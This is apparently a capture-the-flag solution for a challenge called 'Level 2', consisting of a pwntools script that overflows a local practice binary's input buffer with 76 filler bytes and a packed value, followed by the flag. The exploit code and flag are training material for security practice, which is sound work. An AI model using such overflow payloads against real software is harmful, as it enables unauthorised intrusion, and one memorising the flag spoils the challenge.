# Level 2

## Solution

```py
from pwn import *

context.log_level = 'debug'

binary = './level2'
elf = ELF(binary)


io = process(binary)
payload = b'A' * 76  + p32(0x1337)

io.recvuntil(b"Enter the override code to unlock the secret compound: ")

io.sendline(payload)
io.interactive()
```

FLAG : `YCEP25{c0mput3r_0v3rr1d3}`
